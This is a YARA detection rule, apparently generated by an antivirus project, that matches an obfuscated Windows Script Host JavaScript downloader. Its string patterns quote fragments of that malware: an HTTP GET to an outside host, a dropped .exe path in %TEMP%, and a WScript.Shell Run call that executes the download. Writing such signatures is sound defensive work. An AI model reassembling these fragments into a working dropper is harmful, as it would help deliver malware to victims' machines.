rule sig_20160328_f6d0b85f9a59a1469a751668daf24c17 {
  meta:
    description = "datamaliciousorder - file 20160328_f6d0b85f9a59a1469a751668daf24c17.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c441f2b23a9a5b70173b64e39052c7f6f4847213fb08f8b1dbda9f90341dae38"

  strings:
    $s1  = "function Hzrwfxl() {return Fmrarecfbm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"aeMsSjPn8m7VB.exe\";};" fullword ascii
    $s2  = "Nwvrtrs[Moixhnuf](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Vxvmcg](Evwuybq() * 11)} while (Nwvrtrs[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Fmrarecfbm = function Irhamc() {return WScript[Ytfydm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Trimftzxgy(Jdgvozbkv, Uadtyxktpv){return Jdgvozbkv - Uadtyxktpv;};" fullword ascii
    $s6  = "function Upyihg(Wwtst){Fmrarecfbm[\"Run\"](Wwtst, Nmpwliudtf, Nmpwliudtf);};" fullword ascii
    $s7  = "function Rlsnjj() {return ((Qjjqnzagyw == true) && (Qjjqnzagyw == Qaektoww)) ? 1 : Nmpwliudtf;};" fullword ascii
    $s8  = "function Qbfkbe(Utlipzmmtk) {var Fupzz = (1, 2, 3, 4, 5, Utlipzmmtk); return Fupzz;};" fullword ascii
    $s9  = "var Qjjqnzagyw = false;" fullword ascii
    $s10 = "var Qaektoww = false;" fullword ascii
    $s11 = "var Sxzbsxaeup = false;" fullword ascii
    $s12 = "return Trimftzxgy(Kunbedn, Kueqzd);" fullword ascii
    $s13 = "function Evwuybq(){return 22;};" fullword ascii
    $s14 = "Qjjqnzagyw = true; " fullword ascii
    $s15 = "function Tuzsiit(){return Vrlwtvy;};" fullword ascii
    $s16 = "Qaektoww = true; " fullword ascii
    $s17 = "var Byamujv = new this[\"Date\"]();" fullword ascii
    $s18 = " while (Mxmht){" fullword ascii
    $s19 = "function Oweiief(){return Ytfydm;};" fullword ascii
    $s20 = "function Pkvelolwwh()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}